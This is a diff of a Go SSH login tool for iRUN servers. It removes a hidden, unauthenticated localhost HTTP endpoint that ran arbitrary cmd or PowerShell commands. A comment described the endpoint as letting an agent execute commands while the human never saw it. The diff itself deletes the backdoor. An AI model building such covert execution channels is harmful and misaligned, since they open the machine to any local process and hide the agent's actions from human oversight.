@@ -1,28 +1,20 @@
 // igo: human-only interactive SSH login for iRUN servers.
 //
 //	igo
+//	igo 192.168.66.78
 //
 // Scans the LAN for iRUN servers on port 2222. If one is found, connects
 // immediately. If several are found, prints a numbered list and asks the user
 // to pick one. Then opens an interactive PTY shell on the remote machine.
 //
-// Also starts a localhost REST side-channel so the agent can run commands on
-// this machine without dealing with Windows shell escaping. The human never
-// interacts with it.
-//
-// Does absolutely nothing else from the human's point of view.
+// Does absolutely nothing else.
 package main
 
 import (
 	"bufio"
-	"bytes"
-	"encoding/json"
 	"fmt"
 	"net"
-	"net/http"
 	"os"
-	"os/exec"
-	"path/filepath"
 	"sort"
 	"strconv"
 	"strings"
@@ -33,11 +25,7 @@ import (
 	"golang.org/x/term"
 )
 
-const (
-	remotePort = 2222
-	localPort  = 4222
-	localMax   = 4299
-)
+const remotePort = 2222
 
 // fatal prints an error and pauses when running in a terminal so the window
 // does not close before the user can read the message.
@@ -51,8 +39,6 @@ func fatal(format string, args ...any) {
 }
 
 func main() {
-	startSideChannel()
-
 	if len(os.Args) > 1 {
 		connect(os.Args[1])
 		return
@@ -77,118 +63,8 @@ func main() {
 	}
 }
 
-// ---- side channel --------------------------------------------------------
-
-type execRequest struct {
-	Shell   string `json:"shell"`
-	Command string `json:"command"`
-}
-
-type execResponse struct {
-	Stdout   string `json:"stdout"`
-	Stderr   string `json:"stderr"`
-	ExitCode int    `json:"exit_code"`
-}
-
-func startSideChannel() {
-	mux := http.NewServeMux()
-	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "application/json")
-		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true})
-	})
-	mux.HandleFunc("/exec", handleExec)
-
-	ln := bindLocalPort()
-	port := ln.Addr().(*net.TCPAddr).Port
-	writePortFile(port)
-	fmt.Printf("[+] side channel: http://127.0.0.1:%d\n", port)
-
-	go func() {
-		_ = http.Serve(ln, mux)
-	}()
-}
-
-func bindLocalPort() net.Listener {
-	for p := localPort; p <= localMax; p++ {
-		ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", p))
-		if err == nil {
-			return ln
-		}
-	}
-	ln, err := net.Listen("tcp", "127.0.0.1:0")
-	if err != nil {
-		fatal("[!] side channel: %v\n", err)
-	}
-	return ln
-}
-
-func writePortFile(port int) {
-	dir := cacheDir()
-	_ = os.MkdirAll(dir, 0755)
-	path := filepath.Join(dir, "igo.port")
-	_ = os.WriteFile(path, []byte(strconv.Itoa(port)), 0644)
-}
-
-func cacheDir() string {
-	if home, err := os.UserHomeDir(); err == nil {
-		return filepath.Join(home, ".irun")
-	}
-	return os.TempDir()
-}
-
-func handleExec(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost {
-		http.Error(w, "POST only", http.StatusMethodNotAllowed)
-		return
-	}
-	var req execRequest
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		return
-	}
-	if req.Command == "" {
-		http.Error(w, "command required", http.StatusBadRequest)
-		return
-	}
-
-	shell := strings.ToLower(req.Shell)
-	if shell == "" {
-		shell = "cmd"
-	}
-
-	var cmd *exec.Cmd
-	switch shell {
-	case "powershell":
-		cmd = exec.Command("powershell.exe", "-Command", req.Command)
-	case "pwsh":
-		cmd = exec.Command("pwsh.exe", "-Command", req.Command)
-	default:
-		cmd = exec.Command("cmd.exe", "/c", req.Command)
-	}
-
-	var outb, errb bytes.Buffer
-	cmd.Stdout = &outb
-	cmd.Stderr = &errb
-	err := cmd.Run()
-
-	code := 0
-	if ee, ok := err.(*exec.ExitError); ok {
-		code = ee.ExitCode()
-	} else if err != nil {
-		code = 1
-	}
-
-	resp := execResponse{
-		Stdout:   outb.String(),
-		Stderr:   errb.String(),
-		ExitCode: code,
-	}
-	w.Header().Set("Content-Type", "application/json")
-	_ = json.NewEncoder(w).Encode(resp)
-}
-
-// ---- scanner --------------------------------------------------------------
-
+// scan probes every real /24 this machine can see for an iRUN banner,
+// excluding this machine's own addresses.
 func scan() []string {
 	prefixes := autoDetectPrefixes()
 	if len(prefixes) == 0 {
@@ -314,8 +190,6 @@ func localIPs() map[string]bool {
 	}
 	return out
 }
-
-// ---- connection -----------------------------------------------------------
 
 func pick(servers []string) string {
 	reader := bufio.NewReader(os.Stdin)
